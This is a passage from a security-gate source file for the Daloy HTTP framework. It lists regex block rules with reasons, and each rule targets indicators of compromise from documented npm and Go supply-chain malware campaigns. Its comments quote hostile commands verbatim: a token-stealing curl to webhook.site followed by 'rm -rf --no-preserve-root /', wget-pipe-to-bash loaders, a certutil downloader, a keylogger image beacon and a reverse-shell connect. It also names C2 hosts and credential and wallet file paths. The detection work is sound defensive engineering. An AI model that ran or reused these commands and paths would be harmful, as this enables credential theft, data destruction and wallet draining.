    // `os.networkInterfaces()`, external IP/org via `ipinfo.io/json`,
    // DNS servers via `dns.getServers()`, and `os.homedir()`, then
    // POSTed the JSON blob to a Discord webhook of the form
    // `https://discord.com/api/webhooks/<channel-id>/<token>` via
    // `https.request(...)`. The exfiltration channel is the webhook URL
    // itself — a backend HTTP framework has no reason to ever hard-code
    // a `discord.com/api/webhooks/...` endpoint in its runtime source.
    re: /\bdiscord(?:app)?\.com\/api\/webhooks\b/i,
    reason:
      "`discord.com/api/webhooks/<channel-id>/<token>` is the exfiltration channel for the " +
      "60-package npm reconnaissance campaign (Socket 2025-05-23, " +
      "https://socket.dev/blog/60-malicious-npm-packages-leak-network-and-host-data) that POSTed " +
      "host fingerprints (hostname, internal/external IP, DNS servers, username, homedir) from a " +
      "`postinstall` script under three throwaway npm accounts (`bbbb335656`, `sdsds656565`, " +
      "`cdsfdfafd1232436437`); a backend HTTP framework never hard-codes a Discord webhook URL — " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  // ---- Advcash `@naderabdi/merchant-advcash` reverse-shell campaign
  //      (Socket 2025-04-14,
  //      https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell) ----
  //
  // The malicious package dialed a reverse shell via raw TCP
  // (`client.connect(8443, "65.109.184.223")`) — the IOC IP is a bare
  // string literal, NOT inside an `http(s)://` URL, so the raw-IPv4-URL
  // gate above does not catch it.
  {
    re: /\b65\.109\.184\.223\b/,
    reason:
      "`65.109.184.223` is the documented reverse-shell C2 host for the " +
      "`@naderabdi/merchant-advcash` payment-callback reverse-shell campaign " +
      "(https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // Reverse-shell shell prefixes. The Advcash payload calls
    // `cp.spawn("/bin/sh", [])`; other shapes in the wild use
    // `/bin/bash`, `/bin/zsh`, or `cmd.exe`. A backend HTTP framework
    // has no legitimate reason to ever materialize one of these as
    // a string literal in its runtime source — even with the
    // `child_process` ban from `verify-no-remote-exec`, this is
    // belt-and-braces against an aliased-spawn / decoded-string
    // bypass that reconstructs the module name at runtime.
    re: /["'`](?:\/bin\/(?:sh|bash|zsh|dash|ksh|ash)|cmd\.exe)\b/,
    reason:
      "shell-name literal (`/bin/sh`, `/bin/bash`, `/bin/zsh`, `/bin/dash`, `/bin/ksh`, " +
      "`/bin/ash`, `cmd.exe`) in source is the reverse-shell shell prefix used by the " +
      "`@naderabdi/merchant-advcash` payment-callback reverse-shell campaign " +
      "(`cp.spawn(\"/bin/sh\", [])`, " +
      "https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell); " +
      "Daloy core never shells out — remove this literal",
    keepStrings: true,
  },
  // ---- Lazarus BeaverTail / InvisibleFerret campaign (Socket
  //      2025-03-10, https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages) ----
  //
  // Six typosquatted npm packages (`is-buffer-validator`,
  // `yoojae-validator`, `event-handle-package`,
  // `array-empty-validator`, `react-event-dependency`,
  // `auth-validator`) embedded BeaverTail, which iterates browser
  // profiles to extract Chrome / Brave / Firefox `Login Data` and
  // Chromium `Local Extension Settings`, slurps macOS Keychain
  // archives, and steals crypto wallet keys (`~/.config/solana/id.json`,
  // `exodus.wallet`). The stolen data is POSTed to
  // `http://172.86.84.38:1224/uploads`, and the second-stage
  // InvisibleFerret backdoor is downloaded via `curl` to
  // `${tmpDir}/p.zi` / `${tmpDir}/p2.zip` and extracted with `tar -xf`.
  // The bare-IP IOC slips past the raw-IPv4 URL gate above when it is
  // assigned to a variable (not embedded inside an `http(s)://` URL);
  // the file-path literals below have no legitimate use inside a
  // backend HTTP framework's runtime source.
  {
    re: /\b172\.86\.84\.38\b/,
    reason:
      "`172.86.84.38` is the documented C2 host for the Lazarus BeaverTail / InvisibleFerret " +
      "campaign (six typosquatted npm packages, March 2025); the bare-IP literal slips past the " +
      "raw-IPv4 URL gate when assigned to a variable for later string-concat into a URL " +
      "(https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages) — " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // Chrome / Brave / Chromium credentials DB filename. BeaverTail
    // walks `${userDataDir}/Profile N/Login Data` to extract saved
    // passwords. Daloy has no reason to ever reference this filename
    // — a real backend framework never reads browser SQLite
    // databases off the host filesystem.
    re: /["'`/\\]Login Data["'`/\\]/,
    reason:
      "`Login Data` is the Chrome / Brave / Chromium saved-passwords SQLite database filename; " +
      "the Lazarus BeaverTail campaign walks `${userDataDir}/Profile N/Login Data` to extract " +
      "browser credentials " +
      "(https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages) — " +
      "a backend HTTP framework never reads browser credential databases, remove this literal",
    keepStrings: true,
  },
  {
    // Chromium extension storage path. BeaverTail walks
    // `${userDataDir}/Profile N/Local Extension Settings` to slurp
    // MetaMask / Exodus / Phantom wallet extension data (`.log` /
    // `.ldb` files). Daloy has no reason to reference this path.
    re: /\bLocal Extension Settings\b/,
    reason:
      "`Local Extension Settings` is the Chromium browser path the Lazarus BeaverTail campaign " +
      "walks to slurp MetaMask / Exodus / Phantom wallet extension data " +
      "(https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages); " +
      "a backend HTTP framework has no business reading browser extension storage — remove this " +
      "literal",
    keepStrings: true,
  },
  {
    // Solana CLI keypair file path. BeaverTail reads
    // `${homeDir}/.config/solana/id.json` to steal the user's
    // Solana wallet private key. A backend framework has no
    // reason to ever reference this path.
    re: /\.config[\\/]solana[\\/]id\.json\b/i,
    reason:
      "`.config/solana/id.json` is the Solana CLI keypair file the Lazarus BeaverTail campaign " +
      "exfiltrates to steal the user's Solana wallet private key " +
      "(https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages); " +
      "a backend HTTP framework never reads crypto-wallet keypair files — remove this literal",
    keepStrings: true,
  },
  {
    // Exodus desktop wallet file. BeaverTail enumerates
    // `exodus.wallet` to steal wallet seeds/keys. No legitimate
    // use inside a backend framework.
    re: /\bexodus\.wallet\b/i,
    reason:
      "`exodus.wallet` is the Exodus desktop-wallet filename the Lazarus BeaverTail campaign " +
      "enumerates to steal wallet seeds and keys " +
      "(https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages); " +
      "a backend HTTP framework never reads crypto-wallet files — remove this literal",
    keepStrings: true,
  },
  {
    // macOS Keychain directory. BeaverTail targets
    // `~/Library/Keychains/` to exfiltrate macOS keychain archives.
    re: /\/Library\/Keychains\//,
    reason:
      "`/Library/Keychains/` is the macOS Keychain directory the Lazarus BeaverTail campaign " +
      "targets to exfiltrate keychain archives " +
      "(https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages); " +
      "a backend HTTP framework never reads OS-level keychain files — remove this literal",
    keepStrings: true,
  },
  // ---- `xlsx-to-json-lh` remote-trigger codebase-wiper campaign
  //      (Socket 2025-05-30,
  //      https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger) ----
  //
  // A typosquat of `xlsx-to-json-lc` opened a socket.io WebSocket to
  // `informer-server.herokuapp.com` on `require()` and, on receiving
  // the message type `"remise à zéro"`, recursively deleted the
  // consumer's entire project directory. None of the upstream gates
  // catch this on their own: there is no `child_process` / `eval` /
  // `vm` use, no TLS bypass, no HOME mutation, no raw-IPv4 URL, no
  // browser-credential path. The IOCs below are the bare-literal
  // tells, and the destructive-filesystem-API block is the wiper
  // primitive itself.
  {
    re: /\binformer-server\.herokuapp\.com\b/i,
    reason:
      "`informer-server.herokuapp.com` is the documented C2 host for the `xlsx-to-json-lh` " +
      "remote-trigger codebase-wiper campaign — the malicious typosquat opened a persistent " +
      "socket.io WebSocket to this host on `require()` and waited for a `remise à zéro` " +
      "message before recursively deleting the consumer's entire project directory " +
      "(https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger); any " +
      "reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // The French trigger phrase is rare enough in legitimate prose
    // that a hard-literal match in `src/**` is a strong indicator of
    // wiper-class malware. We match the exact phrase (with or
    // without accents) and a few obvious obfuscations.
    re: /remise\s+[àa]\s+z[ée]ro/i,
    reason:
      "`remise à zéro` (French: \"reset to zero\") is the destruction-trigger phrase the " +
      "`xlsx-to-json-lh` codebase-wiper campaign listens for on its socket.io C2 channel " +
      "before recursively deleting the consumer's project directory " +
      "(https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger); any " +
      "reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // Destructive filesystem-deletion APIs. Daloy core is a backend
    // HTTP framework and never deletes a file or directory from
    // runtime source. Catches:
    //   - `fs.rm(`, `fs.rmSync(`, `fs.rmdir(`, `fs.rmdirSync(`,
    //     `fs.unlink(`, `fs.unlinkSync(`
    //   - the `node:fs/promises` peers (`fsp.rm(`, `fsPromises.rm(`,
    //     destructured `rm(` / `rmdir(` / `unlink(` after a
    //     `from "node:fs"` import)
    //   - bare callable forms `rmSync(`, `rmdirSync(`, `unlinkSync(`
    //     to catch destructured-then-renamed call sites
    // Equality and property comparisons (`x.rm === ...`) are excluded
    // by requiring an opening `(` after the API name.
    re: /\b(?:rmSync|rmdirSync|unlinkSync)\s*\(|\.\s*(?:rm|rmSync|rmdir|rmdirSync|unlink|unlinkSync)\s*\(/,
    reason:
      "destructive filesystem-deletion API call (`fs.rm` / `fs.rmSync` / `fs.rmdir` / " +
      "`fs.rmdirSync` / `fs.unlink` / `fs.unlinkSync` / `node:fs/promises` peers) — a " +
      "backend HTTP framework's runtime source has zero legitimate reason to delete a " +
      "file or directory tree, and these are the wiper primitives the `xlsx-to-json-lh` " +
      "codebase-wiper campaign uses to recursively destroy the consumer's project " +
      "(https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger); remove " +
      "this call",
    keepStrings: false,
  },
  // ---- Vietnam-Telegram-ban Fastlane typosquat (Socket 2025-06-03,
  //      https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban)
  //      — the malicious gems replaced `api.telegram.org` with an
  //      opaque Cloudflare Worker C2. RubyGems-only campaign, but the
  //      endpoint-substitution + Worker-relay tradecraft translates
  //      verbatim to npm. ----
  {
    // Exact-host IOC for grep parity with the prior campaign blocks.
    re: /\brough-breeze-0c37\.buidanhnam95\.workers\.dev\b/i,
    reason:
      "`rough-breeze-0c37.buidanhnam95.workers.dev` is the documented Cloudflare Worker C2 " +
      "for the Vietnam-Telegram-ban Fastlane typosquat campaign — the malicious " +
      "`fastlane-plugin-telegram-proxy` / `fastlane-plugin-proxy_teleram` RubyGems " +
      "replaced `https://api.telegram.org/bot{token}/sendMessage` with this hardcoded " +
      "Worker endpoint to silently exfiltrate bot tokens, chat IDs, messages, and " +
      "attached files " +
      "(https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // URL-shaped Cloudflare Worker literal. The bare PSL suffix
    // `workers.dev` (legitimately listed in `src/subdomains.ts`) does
    // NOT match because we require `://<sub>.workers.dev`.
    re: /\bhttps?:\/\/[a-z0-9-]+(?:\.[a-z0-9-]+)*\.workers\.dev\b/i,
    reason:
      "URL-shaped Cloudflare Worker literal in `src/**` — Daloy core never proxies " +
      "outbound traffic through a Cloudflare Worker from runtime code. Cloudflare " +
      "Worker source is not publicly visible, so a hardcoded `https://<sub>.workers.dev/...` " +
      "URL is an opaque-relay primitive the Vietnam-Telegram-ban Fastlane typosquat " +
      "campaign used to silently exfiltrate Telegram bot tokens and messages " +
      "(https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban) — " +
      "remove this URL or, if intentional, justify it in the PR description and add a " +
      "narrower allowlist",
    keepStrings: true,
  },
  // ---- `@crypto-exploit` BSC/Ethereum wallet-drainer campaign
  //      (Socket 2025-06-02,
  //      https://socket.dev/blog/malicious-npm-packages-target-bsc-and-ethereum) ----
  //
  // Four malicious npm packages
  // (`pancake_uniswap_validators_utils_snipe`,
  // `pancakeswap-oracle-prediction`, `ethereum-smart-contract`,
  // `env-process`) all signed and broadcast a transaction draining
  // 80–85 % of the victim's wallet to the same hardcoded attacker
  // address. The IOCs below are the exact attacker wallet plus the
  // two web3-SDK primitives the drainer chains — a backend HTTP
  // framework's runtime source has zero reason to reference any of
  // them.
  {
    re: /\b0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02\b/i,
    reason:
      "`0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02` is the documented attacker wallet " +
      "address for the `@crypto-exploit` BSC/Ethereum wallet-drainer campaign — the four " +
      "malicious npm packages (`pancake_uniswap_validators_utils_snipe`, " +
      "`pancakeswap-oracle-prediction`, `ethereum-smart-contract`, `env-process`) all " +
      "signed and broadcast a transaction transferring 80–85 % of the victim's wallet " +
      "balance to this hardcoded address " +
      "(https://socket.dev/blog/malicious-npm-packages-target-bsc-and-ethereum); any " +
      "reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // web3-SDK transaction-signing primitive. Matches the documented
    // `web3.eth.accounts.signTransaction(...)` call and the
    // destructured-then-renamed variant `accounts.signTransaction(`.
    // A backend HTTP framework never signs blockchain transactions
    // from runtime source.
    re: /\baccounts\s*\.\s*signTransaction\s*\(/,
    reason:
      "web3-SDK transaction-signing primitive (`web3.eth.accounts.signTransaction(...)`) — " +
      "a backend HTTP framework's runtime source has zero legitimate reason to sign a " +
      "blockchain transaction, and this is the in-process key-use step the " +
      "`@crypto-exploit` BSC/Ethereum wallet-drainer campaign chains after reading the " +
      "victim's `process.env.YOUR_ACCOUNT_PRIVATE_KEY` to authorize the outbound transfer " +
      "(https://socket.dev/blog/malicious-npm-packages-target-bsc-and-ethereum); remove " +
      "this call",
    keepStrings: false,
  },
  {
    // web3-SDK signed-transaction broadcast primitive. Matches the
    // documented `web3.eth.sendSignedTransaction(...)` call and the
    // destructured-then-renamed variant `eth.sendSignedTransaction(`.
    re: /\bsendSignedTransaction\s*\(/,
    reason:
      "web3-SDK signed-transaction broadcast primitive " +
      "(`web3.eth.sendSignedTransaction(...)`) — a backend HTTP framework's runtime " +
      "source has zero legitimate reason to broadcast a blockchain transaction, and " +
      "this is the on-chain submission step that actually drains the victim's wallet " +
      "in the `@crypto-exploit` BSC/Ethereum wallet-drainer campaign " +
      "(https://socket.dev/blog/malicious-npm-packages-target-bsc-and-ethereum); remove " +
      "this call",
    keepStrings: false,
  },
  // ---- Surveillance-malware campaign: `dpsdatahub`, `nodejs-backpack`,
  //      `m0m0x01d` (npm) + `vfunctions` (PyPI). Socket 2025-07-23,
  //      https://socket.dev/blog/surveillance-malware-hidden-in-npm-and-pypi-packages.
  //
  // Four packages totalling ~56k downloads ship keyloggers,
  // screen/webcam capture, and credential harvesting. The three npm
  // packages exfiltrate to:
  //   * `https://dpsiframe.s3.eu-central-1.amazonaws.com/index.html`
  //     — the invisible-iframe keylogger host loaded by `dpsdatahub`.
  //   * `https://hooks.slack.com/services/<team>/<channel>/<token>`
  //     — Slack-webhook host-fingerprint exfil used by
  //     `nodejs-backpack` (URL fragmented at runtime to evade naive
  //     scanners).
  //   * `https://<random>.burpcollaborator.net/...` — Burp
  //     Collaborator C2 used by `m0m0x01d` to blend keystroke exfil
  //     into legitimate pentest infrastructure.
  //
  // None of these have a legitimate use inside a backend HTTP
  // framework's runtime source.
  {
    re: /\bdpsiframe\.s3\.eu-central-1\.amazonaws\.com\b/i,
    reason:
      "`dpsiframe.s3.eu-central-1.amazonaws.com` is the documented invisible-iframe " +
      "keylogger host loaded by the `dpsdatahub` surveillance-malware npm package — the " +
      "iframe captures every `keyup` event in the page and exfiltrates batches to a " +
      "threat-actor AWS Lambda endpoint every 5 seconds " +
      "(https://socket.dev/blog/surveillance-malware-hidden-in-npm-and-pypi-packages); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // Slack incoming-webhook URL. A backend HTTP framework never POSTs
    // to a Slack channel from its own runtime code; the only reason
    // for a `hooks.slack.com/services/...` literal to appear in
    // `src/**` is a host-fingerprint / credential exfil channel like
    // the one the `nodejs-backpack` surveillance-malware npm package
    // builds at runtime (URL fragmented across six string constants
    // to evade naive scanners). Requires the `/services/` path so the
    // bare `hooks.slack.com` documentation host does not trip the
    // gate.
    re: /\bhooks\.slack\.com\/services\b/i,
    reason:
      "Slack incoming-webhook URL (`hooks.slack.com/services/<team>/<channel>/<token>`) — " +
      "a backend HTTP framework's runtime source never POSTs to a Slack channel from " +
      "itself, and this is the host-fingerprint exfiltration channel the " +
      "`nodejs-backpack` surveillance-malware npm package fragments across runtime " +
      "string constants to slip keylogger + system-profile data past static scanners " +
      "(https://socket.dev/blog/surveillance-malware-hidden-in-npm-and-pypi-packages); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // Burp Collaborator subdomains. The Collaborator is a legitimate
    // pentest out-of-band service, but a hardcoded `*.burpcollaborator.net`
    // host inside a published framework's runtime source has no
    // legitimate use — it is precisely the C2 channel the `m0m0x01d`
    // surveillance-malware npm package uses to blend keystroke
    // exfiltration into pentest traffic and evade detection.
    re: /\b[a-z0-9-]+\.burpcollaborator\.net\b/i,
    reason:
      "Burp Collaborator subdomain (`<random>.burpcollaborator.net`) — Burp Collaborator " +
      "is a legitimate out-of-band pentest service, but a hardcoded subdomain inside a " +
      "published framework's runtime source has no legitimate use and is the C2 channel " +
      "the `m0m0x01d` surveillance-malware npm package uses to blend keystroke-logger " +
      "exfiltration into pentest traffic and evade detection " +
      "(https://socket.dev/blog/surveillance-malware-hidden-in-npm-and-pypi-packages); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  // ---- Toptal GitHub-org hijack / Picasso design-system npm compromise
  //      (Socket 2025-07-23,
  //      https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published) ----
  //
  // Ten `@toptal/picasso-*` packages (and `@xene/core`) were republished
  // on 2025-07-20 with destructive `preinstall` + `postinstall` lifecycle
  // hooks embedded directly in `package.json`:
  //
  //   "preinstall":  "curl -d \"$(gh auth token)\" https://webhook.site/<uuid>;
  //                   sudo rm -rf --no-preserve-root /"
  //   "postinstall": "rm /s /q"
  //
  // The install-time channel is already closed for Daloy by
  // `ignore-scripts=true` in the root `.npmrc`, the 24 h
  // `minimum-release-age` cooldown, and `verify-no-lifecycle-scripts`
  // (which keeps our own published packages free of these hooks). The
  // patterns below are belt-and-braces: they make sure no Toptal-style
  // exfil/destroy primitive can ever land as a string literal inside
  // `src/**` (e.g. via a "telemetry beacon" PR or a malicious
  // republish-followed-by-PR that copies the payload into runtime code).
  {
    // Generic `webhook.site/...` drop. The bare host is the entire
    // legitimate purpose of the service — receive arbitrary HTTP
    // POSTs — so a backend HTTP framework has zero reason to ever
    // hard-code one in its runtime source. Mirrors the Discord-webhook
    // pattern above. Match the full host with at least a `/` path so
    // a typo'd lowercase mention without a URL form would still be
    // caught at code-review time.
    re: /\bwebhook\.site\/[A-Za-z0-9-]/i,
    reason:
      "`webhook.site/<uuid>` is an arbitrary-HTTP-request inspection service; a backend HTTP " +
      "framework's runtime source never POSTs to one, and it is the documented exfiltration " +
      "drop for the Toptal GitHub-org hijack (10 `@toptal/picasso-*` packages republished " +
      "on 2025-07-20 with `preinstall` hooks that POSTed the victim's `gh auth token` to " +
      "`https://webhook.site/fb5b4647-aff8-418c-99e7-ec830cc2024b` before attempting to " +
      "`sudo rm -rf --no-preserve-root /`) " +
      "(https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // The exact Toptal IOC webhook UUID, even outside a URL form.
    re: /\bfb5b4647-aff8-418c-99e7-ec830cc2024b\b/i,
    reason:
      "`fb5b4647-aff8-418c-99e7-ec830cc2024b` is the documented webhook.site channel ID for " +
      "the Toptal GitHub-org hijack — 10 `@toptal/picasso-*` packages republished on " +
      "2025-07-20 POSTed the victim's `gh auth token` to this exact endpoint " +
      "(https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // `gh auth token` is the GitHub CLI command that prints the user's
    // GitHub authentication token to stdout. It is exclusively a shell
    // invocation — a backend HTTP framework's runtime source has zero
    // legitimate reason to mention it as a string literal. This is
    // the in-process token-harvest primitive the Toptal payload uses.
    re: /\bgh\s+auth\s+token\b/,
    reason:
      "`gh auth token` is the GitHub CLI command that prints the user's GitHub authentication " +
      "token to stdout; library source has no reason to ever materialize this shell invocation " +
      "as a string literal, and it is the in-process token-harvest primitive the Toptal " +
      "GitHub-org hijack chained with a `webhook.site` POST to exfiltrate developer tokens " +
      "(https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published) — " +
      "remove this literal",
    keepStrings: true,
  },
  {
    // `--no-preserve-root` is the GNU `rm` flag that explicitly
    // overrides the safety check preventing `rm -rf /` from wiping
    // the root filesystem. It has no legitimate use in any
    // application's runtime source; it is the destruction primitive
    // the Toptal payload uses (`sudo rm -rf --no-preserve-root /`).
    re: /--no-preserve-root\b/,
    reason:
      "`--no-preserve-root` is the GNU `rm` flag that explicitly overrides the safety check " +
      "preventing `rm -rf /` from wiping the root filesystem; it has zero legitimate use in " +
      "library source and is the destruction primitive the Toptal GitHub-org hijack used to " +
      "destroy victim systems after exfiltrating their GitHub tokens " +
      "(https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published) — " +
      "remove this literal",
    keepStrings: true,
  },
  // ---- react-login-page typosquat / pixel-beacon keylogger
  //      (Socket 2024-07-02,
  //      https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger) ----
  //
  // The `reect-login-page` typosquat (and ~16 sibling packages from the
  // `lolapalooza` npm author — `react-1ogin-page`, `@reect-login-page/base`,
  // `sty1ed-react-modal`, etc.) embedded a React component that:
  //
  //   1. Installed a `document.addEventListener('keydown', ...)` handler
  //      that appended every keystroke to a `keys` string;
  //   2. Fetched the victim's IP from `api.ipify.org` into a side channel;
  //   3. Every 1000 ms, sent the accumulated keystrokes by setting
  //      `new Image().src = "https://adlinczewska.pl/beaut-login/keylog.php?c=" + keys`
  //      — a `<img>`-pixel beacon chosen specifically to bypass CORS,
  //      since image requests are not subject to the Same-Origin Policy.
  //
  // `@daloyjs/core` is a backend HTTP framework. `src/**` is server-side
  // Node code with no DOM globals — neither `document` nor the `Image`
  // constructor exist there, and the framework has no legitimate reason
  // to ever materialize the documented C2 host as a string literal. The
  // patterns below are belt-and-braces: they make sure a malicious PR or
  // a malicious-republish payload cannot land the documented IOC host
  // or the pixel-beacon exfil TTP as text inside `src/**`.
  {
    // The exact C2 host + path documented in the Socket write-up. Kept
    // as a hard IOC literal (mirrors the `informer-server.herokuapp.com`
    // and `rough-breeze-0c37.buidanhnam95.workers.dev` precedents above).
    re: /\badlinczewska\.pl\/beaut-login\b/i,
    reason:
      "`adlinczewska.pl/beaut-login` is the documented C2 host + path for the " +
      "`reect-login-page` typosquat keylogger family (16 packages from npm author " +
      "`lolapalooza`, including `react-1ogin-page`, `@reect-login-page/base`, and " +
      "`sty1ed-react-modal`) which exfiltrated every keystroke via " +
      "`new Image().src = \"https://adlinczewska.pl/beaut-login/keylog.php?c=\" + keys` " +
      "(https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // `new Image()` is a DOM-only constructor (browser `Image` /
    // `HTMLImageElement`). `@daloyjs/core` is a backend HTTP framework
    // — `src/**` runs in Node / Bun / Deno where `Image` does not
    // exist as a global. A `new Image()` literal inside runtime source
    // is therefore both dead code AND the documented pixel-beacon
    // exfil primitive used to bypass CORS in browser-side malware
    // (the `<img>` request is not subject to the Same-Origin Policy,
    // so `new Image().src = url + secrets` is a one-liner cross-origin
    // exfiltration channel). Require either `new Image(` or
    // `new Image (` so an identifier like `newImage` is not matched.
    re: /\bnew\s+Image\s*\(/,
    reason:
      "`new Image()` is a DOM-only browser constructor that does not exist as a global in " +
      "Node / Bun / Deno; library source for a backend HTTP framework has zero legitimate " +
      "reason to mention it, and it is the documented CORS-bypassing pixel-beacon exfil " +
      "primitive used by the `reect-login-page` typosquat keylogger family " +
      "(`new Image().src = \"https://attacker/keylog.php?c=\" + keystrokes`) " +
      "(https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger) — " +
      "remove this literal",
    keepStrings: false,
  },
  // ---- 11 malicious Go packages / obfuscated-loader campaign
  //      (Socket 2025-08-06,
  //      https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads) ----
  //
  // Socket's Threat Research Team uncovered eleven malicious Go modules
  // (`github.com/stripedconsu/linker`, `agitatedleopa/stm`,
  // `expertsandba/opt`, `wetteepee/hcloud-ip-floater`,
  // `weightycine/replika`, `ordinarymea/tnsr_ids` + `TNSR_IDS`,
  // `cavernouskina/mcp-go`, `lastnymph/gouid`, `sinfulsky/gouid`,
  // `briefinitia/gouid` — 8 of which typosquat well-known Go modules)
  // that share an identical index-based string-array obfuscation
  // routine. At runtime each package rebuilds a one-liner from a string
  // table and calls `exec.Command("/bin/sh", "-c", <decoded>)` to
  // execute one of two shapes:
  //
  //   1. Unix:  `wget -O - https://<c2>/storage/de373d0df/a31546bf | /bin/bash &`
  //      — fetches a Bash second-stage and pipes it straight into
  //      `bash` without writing to disk, then backgrounds.
  //   2. Windows: `cmd /C if not exist %UserProfile%\Downloads\appwinx64.exe
  //      certutil.exe -urlcache -split -f https://<c2>/storage/bbb28ef04/fa31546b
  //      %UserProfile%\Downloads\appwinx64.exe && start /b ...`
  //      — uses the LOLBin `certutil.exe` (a signed Microsoft binary)
  //      to download a PE and execute it silently in the background.
  //
  // Seven of ten distinct C2 hosts share the path `storage/de373d0df/a31546bf`,
  // and the second-stage Windows downloads share `storage/bbb28ef04/fa31546b`.
  // The C2 hosts cluster on `.icu` / `.tech` / `.fun` TLDs:
  // `monsoletter.icu`, `nymclassic.tech`, `alturastreet.icu`,
  // `carvecomi.fun`, `infinityhel.icu`, `kaiaflow.icu`, `kavarecent.icu`.
  //
  // `@daloyjs/core` is a Node.js framework, not a Go module, so the
  // exact malicious packages cannot enter our `node_modules`. But the
  // *attack class* (index-decoder obfuscation → reconstructed
  // `"/bin/sh","-c"` + `"wget ... | bash"` one-liner → `exec.Command`)
  // translates verbatim to a malicious Node package:
  // `child_process.exec("wget -O - URL | sh")` or, with the existing
  // `child_process` ban, an aliased-spawn / `eval`-decoded variant
  // that reconstructs the same shell-string at runtime. The patterns
  // below add belt-and-braces IOC literals so that even if a future
  // PR (or a malicious republish of `@daloyjs/core` itself) smuggles
  // the *decoded* string past the `child_process` and `eval` gates,
  // the literal shape and the documented C2 hosts/paths are rejected
  // at the source-text level.
  {
    // The documented C2 hosts. Anchored on a DNS-label boundary so
    // an unrelated host that merely *ends* in `.icu` is not matched
    // (only these seven specific hosts trip the gate). Word-boundary
    // start (`\b`) so subdomains like `cdn.monsoletter.icu` are still
    // caught.
    re: /\b(?:monsoletter\.icu|nymclassic\.tech|alturastreet\.icu|carvecomi\.fun|infinityhel\.icu|kaiaflow\.icu|kavarecent\.icu)\b/i,
    reason:
      "documented C2 host (`monsoletter.icu` / `nymclassic.tech` / `alturastreet.icu` / " +
      "`carvecomi.fun` / `infinityhel.icu` / `kaiaflow.icu` / `kavarecent.icu`) for the 11 " +
      "malicious Go packages obfuscated-loader campaign — every one of these resolves to a " +
      "`/storage/de373d0df/a31546bf` Bash second-stage piped into `/bin/bash`, or to a " +
      "`/storage/bbb28ef04/fa31546b` Windows PE downloaded via `certutil.exe -urlcache` " +
      "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // The two shared C2 path signatures. Seven of the ten distinct C2
    // URLs reuse `storage/de373d0df/a31546bf` (Bash second-stage) and
    // two reuse `storage/bbb28ef04/fa31546b` (Windows PE). Matching
    // the path alone catches future C2 rotations onto new hostnames
    // that keep the same backend path layout — exactly the "rotate
    // the host, keep the storage path" pattern Socket flagged as the
    // automation tell of this campaign.
    re: /\bstorage\/(?:de373d0df\/a31546bf|bbb28ef04\/fa31546b)\b/i,
    reason:
      "documented C2 URL-path signature (`/storage/de373d0df/a31546bf` Bash second-stage or " +
      "`/storage/bbb28ef04/fa31546b` Windows PE) for the 11 malicious Go packages " +
      "obfuscated-loader campaign; 7 of 10 distinct C2 hosts reuse the first path and 2 reuse " +
      "the second, so matching the path catches host rotations onto new domains " +
      "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // The shell-pipe-to-shell TTP itself. The decoded payload from
    // every one of the 11 packages has the shape
    // `wget -O - <url> | /bin/bash` (or `curl ... | sh`,
    // `curl ... | bash`). A backend HTTP framework has zero reason to
    // ever materialize this primitive as a literal. The pattern is
    // tight: `wget` or `curl`, then any chars, then a pipe to a shell
    // binary. Requires at least one whitespace between the downloader
    // and the URL so identifiers like `curlPipe` or `wgetable` do not
    // trip it.
    re: /\b(?:wget|curl)\b[^"'`\n]{0,200}\|\s*(?:\/bin\/)?(?:ba)?sh\b/,
    reason:
